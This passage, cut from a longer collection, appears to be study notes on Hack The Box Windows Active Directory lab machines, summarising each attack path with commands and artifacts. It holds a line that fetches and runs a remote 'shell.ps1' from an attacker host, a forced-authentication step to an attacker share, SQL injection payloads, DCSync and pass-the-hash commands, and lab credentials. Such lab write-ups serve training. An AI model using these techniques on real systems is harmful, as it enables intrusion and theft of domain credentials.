**Memory chain:** LDAP enumeration → SMB enumeration → group-membership abuse → Kerberos ticket abuse → BloodHound path analysis → ticket/helpdesk disclosure → ACL abuse → WinRM → registry secrets → reverse shell

- Users in the HelpDesk group can also change the password of the bb.morgan , ee.reed and the dd.ali users using the ForceChangePassword ACE And since the bb.morgan user is in the Remote Management Users group, they should be able to use WinRM and access the target machine.
- With the ticket for the bb.morgan user, let's use Evil-Winrm to authenticate and access the target machine.
- So, putting all the pieces together, the users in the RUSTYKEY\Support group ( ee.reed user) have access to write to the registry key, which has a pointer to the 7-zip.dll DLL, which handles the functionality of the 7-zip context menu.
- Before transferring the DLL and setting the registry key, you need to establish a reverse shell connection as the ee.reed user, as this user has the necessary privileges to edit the registry key.
- PS C:\Windows\system32> whoami rustykey\ee.reed After getting the reverse shell as ee.reed user, we need to transfer the DLL and update the registry key to point to the malicious DLL.

#### Commands and PDF search strings

- `nmap 10.10.11.75 -p $ports -sV -sC`
- `nxc smb rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' --shares`
- `nxc smb dc.rustykey.htb --use-kcache --shares`
- `sudo nmap -sU`
- `nxc smb dc.rustykey.htb -k -M timeroast`
- `lookupsid.py -k -no-pass -target-ip 10.10.11.75 dc.rustykey.htb`
- `bloodhound-python -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -c all -ns`
- `evil-winrm -r rustykey.htb -i dc.rustykey.htb`

### Artifacts and exact search anchors

`rustykey.htb`, `/etc/hosts`, `getTGT.py`, `dc.rustykey.htb`, `timecrack.py`, `/usr/share/wordlists/rockyou.txt`, `lookupsid.py`, `/etc/krb5.conf`, `krb5.conf`, `C:\Users\bb.morgan\Documents`, `C:\users\bb.morgan\Desktop\user.txt`, `powerview.ps1`, `M:\SOFTWARE\Classes\CLSID\`, `7-zip32.dll`, `C:\Program Files\7-Zip\7-zip.dll`, `7-zip.dll`, `rev.dll`, `C:\windows\tasks`, `C:\Windows\system32`, `C:\windows\tasks\rev.dll`, `C:\Windows`

Open the PDF around page **5** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- mm.turner's DelegationManager membership has AddAllowedToAct on the DC, but MachineAccountQuota is 0; use SPN-less RBCD with a controlled user instead of trying to add a computer.
- Force-change dd.ali, set the DC's PrincipalsAllowedToDelegateToAccount to dd.ali, obtain dd.ali's TGT, and replace the account key with the TGT session key for U2U/S4U abuse.
- Administrator is marked sensitive/cannot be delegated; impersonate backupadmin instead because it has DCSync/adminCount privileges.
- Use getST with -u2u and the host/DC SPN, export the resulting ccache, and access the DC with Kerberos (for example wmiexec).
- For RBCD, obtain/control a machine account, write `msDS-AllowedToActOnBehalfOfOtherIdentity`, request an impersonation service ticket, and use the ticket against the correct SPN.
- Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.

### Root / Administrator path

**Memory chain:** group-membership abuse → delegation/RBCD → LDAP enumeration → ACL abuse → reverse shell → ticket/helpdesk disclosure → Kerberos ticket abuse → BloodHound path analysis → DCSync/secrets dump → WMI/PowerShell remoting

- Enumerating the outbound access controls of the mm.turner user, we note that this user is a member of the delegationmanager group, which has the AddAllowedToAct ACE over the Domain Controller.
- Which means this user has access to add machines that are allowed to perform Resource-Based Constrained Delegation.
- Then we obtain the delegated service ticket through S4U2self and U2U techniques, impersonating any user in the domain, followed by S4U2proxy .
- But in this case, the Administrator can't be impersonated since this user is set as sensitive to delegation .
- Additionally, this account has the admincount set to True , allowing us to use it to access the target as a Domain Admin.

#### Commands and PDF search strings

- `nxc ldap dc.rustykey.htb --use-kcache -M maq`

### Artifacts and exact search anchors

`dc.rustykey.htb`, `rustykey.htb`, `C:\Windows\Tasks`, `getTGT.py`, `describeTicket.py`, `changepasswd.py`, `getST.py`, `host_dc.rustykey.htb`, `wmiexec.py`, `C:\users\administrator\desktop\root.txt`

Open the PDF around page **13** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 67- DarkZero

**Target:** Windows / Active Directory · Hard

[Detailed notes](./htb-writeups/DarkZero.md) · [Official PDF](./htb-writeups/DarkZero.pdf)

### Machine path overview

DarkZero is a hard-difficulty Windows machine designed around an assumed breach scenario in which the attacker is provided with low-privileged user credentials. The machine features an Active Directory environment with Bidirectional trust, Cross-domain MSSQL Trusted Link, and TGT Delegation. The attacker discovers a misconfigured MSSQL trusted link that points to a different domain ( darkzero.htb -> darkzero.ext ), and the remote login has sysadmin privileges. The attacker enables the xp_cmdshell procedure as a sysadmin and executes commands. The spawned session under MSSQLSERVICE doesn't have the SeImpersonatePrivilege ; however, the user account running the service has the SeServiceLogonRight . The attacker is forced to change the password and get a new session with Logon Type 5 (Service Logon) to regain those privileges and gain system privileges on the DC02 ( darkzero.ext ). To compromise the darkzero.htb domain: the attacker abuses TGT delegation by forcing DC01 to authenticate to DC02, with Unconstrained Delegation enabled.

### Remote enumeration and foothold checks

- With the supplied domain credential, collect BloodHound and note the bidirectional DARKZERO.HTB <-> DARKZERO.EXT trust.
- Connect to DC01 MSSQL with Windows auth and enumerate linked servers/login mappings; the DC02.darkzero.ext linked login is sysadmin.
- Execute through the trusted link, enable xp_cmdshell on DC02, and stage the reverse shell in the EXT domain context.
- Inspect TLS certificate SAN/CN values for hidden virtual hosts and add each name to `/etc/hosts` before directory/content discovery.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Enumerate MSSQL linked servers, login mappings, impersonation paths, and whether commands can be executed through a trusted link under a stronger context.
- Check whether MSSQL `xp_cmdshell` is enabled or can be enabled by the current role; distinguish database-level access from OS command execution.
- Confirm `SeImpersonatePrivilege`, OS build, and available coercion path before selecting a Potato/PrintSpoofer-style token impersonation technique.
- Use SSH/local/dynamic port forwarding for internal-only services and hidden vhosts. Preserve the required Host header/DNS name through the tunnel rather than browsing only `localhost`.
- Enumerate AD CS with `certipy find -vulnerable`; inspect template enrollment rights, subject-name control, EKUs, manager approval, CA officer rights, and web enrollment. Map the exact ESC path before requesting a certificate.

### Post-foothold local enumeration and lateral movement

- The xp_cmdshell token lacks the SeImpersonate privileges expected for the service account; inspect C:\Policy_Backup.inf and its Privilege Rights section.
- Policy_Backup.inf shows svc_sql has SeServiceLogonRight. Recover the account hash/ticket, change to a known password, then use RunasCs with LogonType 5 and BypassUAC to create a true service-logon token.
- Confirm SeImpersonatePrivilege is restored in the new token, then use SharpEfsPotato for SYSTEM on DC02.
- Recovering a cleartext-equivalent password for the required LogonType 5 token is a specific chain: run Rubeus tgtdeleg as svc_sql, convert the kirbi to ccache, tunnel to DC02, request a User-template certificate with certipy using that ticket, authenticate the PFX to recover svc_sql's NT hash, change it to a known password with impacket-changepasswd, then invoke RunasCs with -LogonType 5 -BypassUAC.

### User path

**Memory chain:** password cracking → LDAP enumeration → subdomain enumeration → database enumeration → SMB enumeration → BloodHound path analysis → reverse shell → SeImpersonate/token abuse → registry secrets → saved-credential abuse

- INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: dc01.darkzero.htb WARNING: LDAP Authentication is refused because LDAP signing is enabled.
- PS C:\Windows\system32> whoami /priv PRIVILEGES INFORMATION ---------------------Privilege Name Description State ============================= ============================== ======== SeChangeNotifyPrivilege Bypass traverse checking Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled Lateral Movement Looking at the file system, there's a file Policy_Backup.inf in the root directory.
- The RunasCs can also spawn a remote TCP reverse shell.
- PS C:\Windows\system32> iwr -uri http://10.10.14.104/SharpEfsPotato.exe -o C:\windows\tasks\SharpEfsPotato.exe PS C:\Windows\system32> C:\windows\tasks\SharpEfsPotato.exe -a '/c powershell.exe -c IEX(iwr -uri http://10.10.14.104/shell.ps1 -UseBasicParsing)' SharpEfsPotato by @bugch3ck Local privilege escalation from SeImpersonatePrivilege using EfsRpc.
- Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows PS C:\Windows\system32> whoami /user USER INFORMATION ---------------User Name SID =================== ======== nt authority\system S-1-5-18 PS C:\Windows\system32> The user flag can be found under C:\Users\Administrator\Desktop\user.txt .

#### Commands and PDF search strings

- `nmap -Pn -p$ports -sC -sV 10.129.242.93`
- `netexec mssql 10.129.242.93 -d darkzero.htb -u 'john.w' -p 'RFulUtONCOL!'`
- `impacket-mssqlclient -windows-auth`
- `impacket-ticketConverter svc_sql.kirbi svc_sql.ccache`
- `Certipy v5.0.3 - by Oliver Lyak (ly4k)`

### Artifacts and exact search anchors

`DC01.darkzero.htb`, `darkzero.htb`, `/opt/BloodHound.py.new/bloodhound.py`, `BloodHound.py`, `20250731175728_bloodhound.zip`, `mssqlclient.py`, `xp_cmdshell`, `shell.ps1`, `C:\Windows\system32`, `C:\Policy_Backup.inf`, `C:\windows\tasks\Rubeus.exe`, `C:\windows\tasks\Rubeus.exe tgtdeleg`, `C:\windows\tasks\shisel.exe`, `svc_sql.pfx`, `changepasswd.py`, `RunasCs.ps1`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `C:\windows\tasks\SharpEfsPotato.exe`, `C:\windows\tasks\SharpEfsPotato.exe -a`, `C:\Users\Administrator\Desktop\user.txt`

Open the PDF around page **4** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Enumerate forest trust attributes: TGT delegation is enabled and DC02 has unconstrained delegation.
- Monitor tickets on DC02 with Rubeus, then force DC01 authentication to DC02 using the MSSQL xp_dirtree UNC primitive.
- Extract/export DC01$'s delegated TGT, convert/use the ccache, and DCSync Administrator in darkzero.htb.
- Abuse MSSQL `xp_dirtree` for filesystem discovery or forced SMB authentication. Check web roots, backups, configuration files, and UNC paths; it often works without `xp_cmdshell`.
- Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Confirm `SeImpersonatePrivilege`, OS build, and available coercion path before selecting a Potato/PrintSpoofer-style token impersonation technique.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.

### Root / Administrator path

**Memory chain:** delegation/RBCD → database enumeration → password cracking → Kerberos ticket abuse → DCSync/secrets dump → WinRM → SeImpersonate/token abuse → group-membership abuse

- Alternate Lateral Movement Recover privileges using NtObjectManager There is another technique for recovering all privileges when a user account is used as a service account.
- After getting a shell as svc_sql on DC02, we will download NtObjectManager and upload it to the machine.

#### Commands and PDF search strings

- `impacket-ticketConverter dc01\$.kirbi dc01\$.ccache`
- `impacket-secretsdump -just-dc-user Administrator -k dc01.darkzero.htb`
- `evil-winrm -i dc01.darkzero.htb -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726`
- `Evil-WinRM shell v3.7`

### Artifacts and exact search anchors

`C:\windows\tasks`, `Enum-ADTrusts.ps1`, `darkzero.htb`, `xp_dirtree`, `C:\Windows\system32`, `C:\windows\tasks\Rubeus.exe`, `C:\windows\tasks\Rubeus.exe monitor`, `secretsdump.py`, `dc01.darkzero.htb`, `C:\Users\Administrator\Documents`, `C:\Users\Administrator\Desktop\root.txt`, `C:\windows\tasks and decompress the file`, `ntobjectmanager.1.1.32.zip`, `Be.Windows.Forms.HexBox.dll`, `NDesk.Options.dll`, `NtObjectManager.dll`, `NtObjectManager.dll-Help.xml`, `NtApiDotNet.dll`, `NtApiDotNet.Forms.dll`

Open the PDF around page **11** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 68- Absolute

**Target:** Windows · Insane

[Detailed notes](./htb-writeups/Absolute.md) · [Official PDF](./htb-writeups/Absolute.pdf)

### Machine path overview

Absolute is an Insane Windows Active Directory machine that starts with a webpage displaying some images, whose metadata is used to create a wordlist of possible usernames that may exist on the machine. It turns out that one of these users doesn't require Pre-authentication, therefore posing a valuable target for an ASREP roast attack. The discovered credentials are then used to enumerate LDAP and discover credentials for the user svc_smb , who has access to an SMB share containing a Windows binary. Performing dynamic analysis on the binary reveals that it tries to perform an LDAP connection to the Domain Controller with clear text credentials for the m.lovegod user, who owns the Network Audit group, which in turn has Generic Write over the winrm_user . Following this attack path and performing a shadow credential attack on the winrm_user , one can then WinRM and access the machine. Finally, the KrbRelay tool is used to add the winrm_user user to the Administrators group, leading to fully elevated privileges.

### Remote enumeration and foothold checks

- Extract image metadata/author names from the web page and generate first-initial.last-name variants with username-anarchy.
- Run GetNPUsers across the candidate list; crack d.klay's AS-REP ticket.
- NTLM LDAP fails because users are Protected Users: sync time, configure the realm/FQDN order, obtain a TGT, and use ldapsearch -Y GSSAPI.
- Search LDAP user descriptions; svc_smb's password is stored there. Obtain a Kerberos ticket for svc_smb and use ticket-based smbclient.
- Download the stripped Windows binary from Shared and dynamically analyze it; it performs LDAP with cleartext m.lovegod credentials.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
- Turn file read/LFI into targeted discovery: source code via wrappers, environment/config files, SSH keys, logs, and service credentials. Test traversal normalization and encoding.
- After finding valid users, test every account for Kerberos pre-authentication disabled (`GetNPUsers`), then crack the returned AS-REP hash offline.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
- Test a true SMB null session: blank username and blank password (`smbclient -L //<target> -N`, `netexec smb <target> -u '' -p ''`). A successful login can still reveal users/RIDs even when no useful share is listed.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Try product-specific default credentials and obvious username/password pairs before exploit development; also search tickets/readmes for changed defaults.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
- Identify who belongs to `Remote Management Users`; a valid password/hash/certificate is not enough for WinRM unless the account has logon rights.
- For Shadow Credentials, confirm write access to `msDS-KeyCredentialLink`, add a key credential, obtain a TGT/NT hash with PKINIT, and clean up the added credential afterward.
- Enumerate AD CS with `certipy find -vulnerable`; inspect template enrollment rights, subject-name control, EKUs, manager approval, CA officer rights, and web enrollment. Map the exact ESC path before requesting a certificate.
- With any valid domain credential or ticket, request SPN service tickets (`GetUserSPNs`) and crack them; do not assume the SPN account is obviously privileged.

### Post-foothold local enumeration and lateral movement

- BloodHound the recovered identities: m.lovegod owns Network Audit, and that group has GenericWrite over winrm_user.
- Take/control the group as required, add the controlled user, and use GenericWrite for Shadow Credentials against winrm_user.
- Authenticate with the generated certificate/TGT/hash and enter through WinRM using Kerberos-compatible settings.

### User path

**Memory chain:** source-code review → AS-REP roasting → password cracking → LDAP enumeration → Kerberos ticket abuse → SMB enumeration → WinRM → BloodHound path analysis → default credentials → ACL abuse

- Accounts with this option set can request a Ticket Granting Ticket ( TGT ) from the Key-Distribution-Center ( KDC ), without providing a password. impacket-GetNPUsers absolute.htb/ -no-pass -usersfile usernames We got the ticket for the user d.klay .
- This will work because m.lovegod has the GenericWrite permission over the account, provided that Active Directory Certificate Services ( ADCS ) is installed.
- Note: In BloodHound, if you right-click on an edge and then Help you will find an Abuse info tab that tells you how to exploit this attribute, if it's exploitable.
- In this case, we could abuse GenericWrite to make the winrm_user kerberoastable but that would not take us very far because the password is uncrackable.
- can now use this ticket, in combination with evil-winrm , to finally access the machine. export KRB5CCNAME=winrm_user.ccache evil-winrm -i dc.absolute.htb -r ABSOLUTE.HTB The user flag can be found in C:\Users\winrm_user\Desktop\user.txt .

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.11.181`
- `impacket-GetNPUsers absolute.htb/ -no-pass -usersfile usernames`
- `john klay_ticket --wordlist=/usr/share/wordlists/rockyou.txt`
- `ldapsearch -H ldap://dc.absolute.htb -x -D d.klay@absolute.htb -w Darkmoonsky248girl -s`
- `sudo ntpdate -u dc.absolute.htb`
- `impacket-getTGT absolute.htb/d.klay:Darkmoonsky248girl -dc-ip dc.absolute.htb`
- `ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "dc=absolute,dc=htb"`
- `ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "cn=users,dc=absolute,dc=htb" 'user'`
- `impacket-getTGT absolute.htb/svc_smb:AbsoluteSMBService123! -dc-ip dc.absolute.htb`
- `impacket-smbclient -k -no-pass absolute.htb/svc_smb@dc.absolute.htb`
- `impacket-getTGT absolute.htb/m.lovegod:AbsoluteLDAP2022! -dc-ip dc.absolute.htb`
- `ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b`
- `certipy find -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip 10.10.11.181 target dc.absolute.htb`
- `certipy shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip`
- `evil-winrm -i dc.absolute.htb -r ABSOLUTE.HTB`

### Artifacts and exact search anchors

`absolute.htb`, `dc.absolute.htb`, `/etc/hosts`, `/usr/share/wordlists/rockyou.txt`, `/etc/krb5.conf`, `krb5.conf`, `compiler.sh`, `C:\Windows\System32\Drivers\etc\hosts file and add the following line`, `BloodHound.py`, `owneredit.py`, `dacledit.py`, `msDS-KeyCredentialLink`, `C:\Users\winrm_user\Desktop\user.txt`

Open the PDF around page **5** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Use KrbRelay from the landed session, selecting a suitable CLSID/coercion path, to relay the current Kerberos context to LDAP.
- Use the relayed LDAP privilege to add winrm_user to the local Administrators group, then start a fresh elevated session/token.
- Direct KrbRelay execution from Evil-WinRM returns Access Denied because PowerShell remoting is a noninteractive network-logon session. Launch KrbRelay through RunasCs logon type 9/runas-netonly; the supplied password can be arbitrary because this mode does not validate it locally.
- Run CheckPort.exe first to select a free OXID resolver port and choose a CLSID valid for the target Windows build before relaying to ldap/dc.absolute.htb. After -add-groupmember Administrators succeeds, log out and reconnect so the new group SID is present in the token.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.

### Root / Administrator path

**Memory chain:** Kerberos ticket abuse → LDAP enumeration → WinRM → saved-credential abuse

- After searching around, we eventually find KrbRelay, which works on default Windows installations, in which LDAP signing is disabled.
- Logon Type 9: This logon type is the same as running runas /netonly , meaning that credentials won't be checked and we're authenticating on the network with the provided password.
- It seems like the logon type 9 is our best option at this point because we will authenticate over the network as another user, with any password we want, while we run the application locally as ourselves.
- proceed to fully exploit this vulnerability by adding the winrm_user user to the Administrators group. .\runascs.exe winrm_user -d absolute.htb TotallyNotACorrectPassword -l 9 "C:\users\winrm_user\music\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-30134dd8-B5F4-88214E81C0CF -port 10 -add-groupmember Administrators winrm_user" KrbRelay informs us that LDAP was modified successfully.
- The root flag can be found in C:\Users\Administrator\Desktop\root.txt .

#### Commands and PDF search strings

- No single canonical command; follow the decision reminders and PDF section.

### Artifacts and exact search anchors

`dc.absolute.htb`, `absolute.htb`, `C:\users\winrm_user\music\KrbRelay.exe -spn ldap`, `C:\Users\Administrator\Desktop\root.txt`

Open the PDF around page **17** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 69- APT

**Target:** Windows · Insane

[Detailed notes](./htb-writeups/APT.md) · [Official PDF](./htb-writeups/APT.pdf)

### Machine path overview

APT is an insane difficulty Windows machine where RPC and HTTP services are only exposed. Enumeration of existing RPC interfaces provides an interesting object that can be used to disclose the IPv6 address. The box is found to be protected by a firewall exemption that over IPv6 can give access to a backup share. User enumeration and bruteforce attacks can give us access to the registry which contains login credentials. The machine is configured to allow authentication via the NTLMv1 protocol, which is then can be leveraged to gain system access.

### Remote enumeration and foothold checks

- RPC and HTTP are the only obvious IPv4 services; enumerate RPC interfaces/opnums and use the interesting object to disclose the target's IPv6 address.
- Scan/connect over IPv6: a firewall exemption exposes the backup SMB share that IPv4 hides.
- Crack the protected backup archive, extract registry/NTDS material, and identify Henry Vinson's hash; account timing/expiry may require focused spraying within the valid window.
- When WinRM rejects the initial user, remotely query HKEY_USERS with reg.py; HKU\Software\GiganticHostingManagementSystem stores henry.vinson_adm credentials.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Test a true SMB null session: blank username and blank password (`smbclient -L //<target> -N`, `netexec smb <target> -u '' -p ''`). A successful login can still reveal users/RIDs even when no useful share is listed.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.
- Use SSH/local/dynamic port forwarding for internal-only services and hidden vhosts. Preserve the required Host header/DNS name through the tunnel rather than browsing only `localhost`.

### Post-foothold local enumeration and lateral movement

- Run Seatbelt/local checks and notice LMCompatibilityLevel=2: the host accepts NTLMv1, which is the escalation primitive.
- IPv4 inbound is blocked, so modify RoguePotato and the Impacket RPC relay/server code for IPv6 and force challenge 1122334455667788, the format required by crack.sh.
- Alternative coercion: set Responder's fixed challenge and --lm, then make Windows Defender MpCmdRun scan an attacker UNC file to force SYSTEM authentication.

### User path

**Memory chain:** group-membership abuse → SMB enumeration → password cracking → protected-archive cracking → registry secrets → DCSync/secrets dump → SSH → WinRM

- It is possible to use rpcmap.py to find out which of the methods allow anonymous access. rpcmap.py 'ncacn_ip_tcp:10.10.10.213' -brute-opnums -auth-level 1 -opnum-max 5 The -brute-opnums argument can be used in order to bruteforce the accessible methods.
- SMB We are going to enumerate SMB for any open shares through anonymous authentication. smbclient -N -L //apt The authentication is indeed successful and a share named backup is discovered.
- A file named backup.zip is also found, which we can download for further inspection.
- By using zip2john we can extract the hash and then try to crack it using the rockyou.txt wordlist. zip2john backup.zip > hash john hash -w=/usr/share/wordlists/rockyou.txt --fork=4 The cracking is successful and the password in use is iloveyousomuch .
- First though we forward port 445 from the IPv6 address to localhost as CME is not currently support IPv6. ssh -L '445:[dead:beef::b885:d62a:d679:573f]:445' root@localhost -N grep 'henry.vinson' hashes.ntds cme smb localhost -d htb.local -u henry.vinson -H 2de80758521541d19cabba480b260e8f Unfortunately the login fails, which means that the hash is incorrect.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.10.213`
- `nmap -T4 --min-rate=1000 -sC -sV -6 apt`
- `smbclient -N -L //apt`
- `john hash -w=/usr/share/wordlists/rockyou.txt --fork=4`
- `secretsdump.py local -system registry/SYSTEM -security registry/SECURITY -ntds`
- `ssh -L '445:[dead:beef::b885:d62a:d679:573f]:445' root@localhost -N`
- `cme smb localhost -d htb.local -u henry.vinson -H`
- `cme smb localhost -d htb.local -u henry.vinson -H hashes.txt`
- `evil-winrm -u henry.vinson -i apt -H e53d87d42adaa3ca32bdb34a876cbffb`
- `evil-winrm -u henry.vinson_adm -i apt -p 'G1#Ny5@2dvht'`

### Artifacts and exact search anchors

`rpcmap.py`, `/etc/hosts`, `backup.zip`, `/usr/share/wordlists/rockyou.txt`, `secretsdump.py`, `/tmp/hashes.txt.ntds`, `ADPwdSpray.py`, `reg.py`

Open the PDF around page **10** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Submit the captured NTLMv1 response in NTHASH format to crack.sh and recover the machine account NT hash.
- The APT$ computer account can DCSync; use its hash with secretsdump -just-dc-user Administrator, then pass the Administrator hash.
- Confirm `SeImpersonatePrivilege`, OS build, and available coercion path before selecting a Potato/PrintSpoofer-style token impersonation technique.
- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
- Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.

### Root / Administrator path

**Memory chain:** SeImpersonate/token abuse → Git history/config → NTLM relay/coercion → password cracking → DCSync/secrets dump → WinRM

- The box is found to allow NTLMv1 authentication, which is susceptible to cracking.
- If we manage to steal NTLMv1 authentication hash then we can crack it using the online service crack.sh to obtain the NTLM hash and authenticate as the computer account.
- Now it's time to use crack.sh and submit the hash in the format NTHASH:<hash> .
- This hash can be used to perform DCSync as it belongs to the DC computer account. secretsdump.py 'htb.local/APT$@apt' -hashes :d167c3238864b12f5f82feae86a7f798 just-dc-user administrator This will return the NTLM hash for the domain administrator's account.
- Switch to the WinRM shell and issue the command below: & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2102.40\MpCmdRun.exe" -Scan -ScanType 3 -File \\10.10.14.4\share\file.txt This requests defender to start a scan with scan type set to 3 i.e. scan the specified file.

#### Commands and PDF search strings

- `secretsdump.py 'htb.local/APT$@apt' -hashes :d167c3238864b12f5f82feae86a7f798 just-dc-user administrator`
- `evil-winrm -u administrator -i apt -H c370bddf384a691d811ff3495e8a72e2`

### Artifacts and exact search anchors

`crack.sh`, `packet-0.9.21.tar.gz`, `rpcrt.py`, `__init__.py`, `rpcrelayserver.py`, `self.server.config`, `/usr/bin/python3`, `impacket.examples.ntlmrelayx.utils.config`, `setup.py`, `secretsdump.py`, `Responder.conf`, `Responder.py`, `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2102.40\MpCmdRun.exe`

Open the PDF around page **12** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 70- Multimaster

**Target:** Windows / Active Directory · Insane

[Detailed notes](./htb-writeups/Multimaster.md) · [Official PDF](./htb-writeups/Multimaster.pdf)

### Machine path overview

Multimaster is an insane diﬃculty Windows machine featuring a web application that is vulnerable to SQL Injection. This vulnerability is leveraged to obtain the foothold on the server. Examination the ﬁle system reveals that a vulnerable version of VS Code is installed, and VS Code processes and found to be running on the server. By exploiting debug functionality, a shell as the user cyork can be gained. A password is found in a DLL, which due to password reuse, results in a shell as sbauer . This user is found to have GenericWrite permissions on the user jorden . Abusing this privilege allows us to gain access to the server as this user. jorden is be member of Server Operators group, whose privileges we exploit to get a SYSTEM shell.

### Remote enumeration and foothold checks

- Manually exploit the JSON API SQL injection when automation/WAF behavior is unreliable; identify hash formats and crack the employee passwords with the correct modes.
- Use MSSQL SUSER_SID('MEGACORP\Administrator'), DATALENGTH, and SUBSTRING to exfiltrate the binary SID one byte at a time.
- Remove the final RID to obtain the domain SID, then automate candidate RIDs with SUSER_SNAME(domain-SID + RID); throttle requests (the writeup uses a two-second delay) to avoid the WAF block.
- Spray the enumerated users and cracked passwords over SMB/WinRM; tushikikatomo/finance1 provides the first WinRM shell.
- A quote in the /api/getColleagues JSON body receives 403 from the WAF. Encode the entire JSON request body as UTF-16 (UTF-32 is also accepted by the JSON parser) to pass the filter, then perform the five-column UNION SQL injection and SID/RID exfiltration.
- Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
- Build a clean username list and password-spray deliberately across the protocol that is actually reachable. Test username-as-password and discovered defaults, while avoiding lockout/rate-limit mistakes.
- From MSSQL, query `SUSER_SID('DOMAIN\KnownUser')` to recover a binary SID when LDAP/RPC is blocked. Strip the final RID to obtain the domain SID.
- Use MSSQL `SUSER_SNAME(<domain-SID + candidate RID>)` to reverse-resolve RIDs into domain users/groups. Automate the range and throttle requests if a WAF/rate limit appears.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
- Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.

### Post-foothold local enumeration and lateral movement

- Inspect Program Files and running processes: VS Code/CEF debugging sockets are present. Use cefdebug to enumerate localhost debugger endpoints and execute Node child_process code as cyork.
- As cyork, use Developers access to C:\inetpub; copy MultimasterAPI.dll out and inspect it with dnSpy.
- ColleagueController contains a database connection-string password; check password policy, then spray it—sbauer reuses it.

### User path

**Memory chain:** LDAP enumeration → SMB enumeration → API enumeration → SQL injection → password cracking → WinRM → password spraying → reverse shell → source-code review

- try with each mode. hashcat -a 0 -m 10800 hashes /usr/share/wordlists/rockyou.txt hashcat -a 0 -m 17500 hashes /usr/share/wordlists/rockyou.txt hashcat -a 0 -m 17900 hashes /usr/share/wordlists/rockyou.txt Using the Keccak-384 mode, three of the hashes were successfully cracked.
- identify the total length of the SID using the DATALENGTH() function. test' UNION SELECT 1,2,3,4,DATALENGTH(SUSER_SID('MegaCorp\Administrator'))-- - The SUBSTRING() function can be used to exﬁltrate each character. test' UNION SELECT SUBSTRING(SUSER_SID('MegaCorp\Administrator'),1,1),2,3,4,5-- The query returns 1.
- can stand up an SMB server using Impacket's smbserver.py, in order to transfer it locally for further examination. python smbserver.py share . -username test -password test The net use command is used to map the drive.
- Inspection of MultimasterAPI.Controllers > ColleagueController reveals a database connection string containing the password D3veL0pM3nT! .
- spray against the WinRM service using the obtained password and list of usernames from earlier.

#### Commands and PDF search strings

- `nmap -sC -sV -p$ports 10.10.10.179`
